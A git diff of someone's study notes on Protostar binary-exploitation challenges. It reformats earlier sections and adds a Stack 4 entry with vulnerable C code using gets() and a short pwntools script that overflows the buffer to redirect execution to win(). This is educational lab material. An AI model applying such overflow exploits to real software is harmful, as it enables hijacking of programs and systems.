@@ -3,6 +3,7 @@ Notes while learning binary exploitation from protostar
 
 ## Stack 1 
 - Source code
+	
 	```c
 	#include <stdlib.h>
 	#include <unistd.h>
@@ -36,7 +37,7 @@ Notes while learning binary exploitation from protostar
 
 ## Stack 2 
 - Source Code
-	/stack2/stack2
+	
 	```c
 	#include <stdlib.h>
 	#include <unistd.h>
@@ -68,7 +69,7 @@ Notes while learning binary exploitation from protostar
 	}
 	```
 - Answer 
-	/stack2/exploit.py
+	
 	```python
 	#!/bin/python
 	import os
@@ -88,6 +89,7 @@ Notes while learning binary exploitation from protostar
 
 ## Stack 3
 - Source Code
+	
 	```c
 	#include <stdlib.h>
 	#include <unistd.h>
@@ -115,6 +117,7 @@ Notes while learning binary exploitation from protostar
 	}
 	```
 - Answer
+	
 	```python
 	#!/bin/python
 	from pwn import *
@@ -128,3 +131,43 @@ Notes while learning binary exploitation from protostar
 
 	print(p.recvline())
 	```
+
+
+## Stack 4
+- Source Code 
+	
+	```c
+	#include <stdlib.h>
+	#include <unistd.h>
+	#include <stdio.h>
+	#include <string.h>
+
+	void win()
+	{
+		printf("code flow successfully changed\n");
+	}
+
+	int main(int argc, char **argv)
+	{
+		char buffer[64];
+
+		gets(buffer);
+	}
+	```
+- Answer
+	
+	```python
+	from pwn import *
+
+	pad = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaa'
+	eip = p32(0x080483f4) #0x080483f4 win()
+
+	payload = pad+eip
+	p = process('./stack4')
+	print('sending line')
+	print(payload)
+	p.sendline(payload)
+	print(p.recv())
+	```
+
+
